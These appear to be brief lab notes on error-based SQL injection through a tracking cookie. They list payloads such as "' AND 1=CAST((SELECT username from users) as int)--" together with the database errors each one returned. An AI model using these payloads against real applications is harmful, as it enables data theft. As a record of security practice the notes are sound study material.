Session cookie likely generated by framework and not susceptible to sqli, however

SELECT trackingId from TrackingIdTable where trackingId='IuPb9fPhzy5nRhan'
->
Unterminated string literal started at position 52 in SQL SELECT * FROM tracking
WHERE id = 'IuPb9fPhzy5nRhan''. Expected  char

2) Next try
'--
-> 200 Ok

3) Next try
' AND CAST((SELECT 1) as int)--
->
ERROR: argument of AND must be type boolean, not type integer
  Position: 63

4)
' AND 1=CAST((SELECT 1) as int)--
-> 200 Ok

' AND 1=CAST((SELECT username from users) as int)--
->
Unterminated string literal started at position 95 in SQL SELECT * FROM
 tracking WHERE id = 'jUT0zCsYKp4dJysn' AND 1=CAST((SELECT username from users)
as'. Expected  char
--Appears to be truncated, as'
